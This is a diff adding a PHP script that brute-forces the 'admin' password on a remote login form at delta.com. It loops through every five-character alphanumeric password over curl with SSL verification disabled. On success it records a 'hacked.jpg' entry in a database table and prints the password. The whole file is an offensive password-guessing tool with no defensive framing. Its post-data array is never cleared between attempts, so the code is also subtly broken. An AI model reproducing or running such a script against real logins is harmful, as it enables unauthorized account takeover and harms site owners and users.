@@ -1,0 +1,50 @@
+<?php
+include 'config.php';
+//Show Errors
+error_reporting(E_ALL);
+ini_set('display_errors', '1');
+ini_set('max_execution_time',3600);
+//set up a connection variable for the page you will post data to
+$curl_connection = curl_init('http://delta.com/submit.php');
+//curl basic setup
+curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 300);
+curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
+$post_data['name']='admin';
+$allowed=str_split("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890",1);
+
+foreach($allowed as $i){
+	foreach($allowed as $j){
+		foreach($allowed as $k){
+			foreach($allowed as $l){
+				foreach($allowed as $m){
+					$password = $i . $j . $k . $l . $m;
+					$post_data['password']=$password;
+					foreach($post_data as $key => $value){
+						$post_items[]=$key . '=' . $value;
+					}
+					//format the $post_items into a string
+					$post_string=implode ('&', $post_items);
+					//send the $_POST data to the new page
+					curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);
+					$result=curl_exec($curl_connection);
+					//echo "Trying $password";
+					if(strpos($result,'Correct')!==false){
+						$image='hacked.jpg';
+						$sql1="CREATE TABLE hack (image CHAR(10) NOT NULL,Date datetime NOT NULL DEFAULT NOW());";
+						$result1=mysqli_query($db,$sql1);
+						$sql2="INSERT INTO hack values('$image',NOW());";
+						$result2=mysqli_query($db,$sql2);
+						echo "Password is $password.";
+						exit(0);
+					}
+					else{
+						//echo ",it's wrong.";
+					}
+				}
+			}
+		}
+	}
+}
+?>
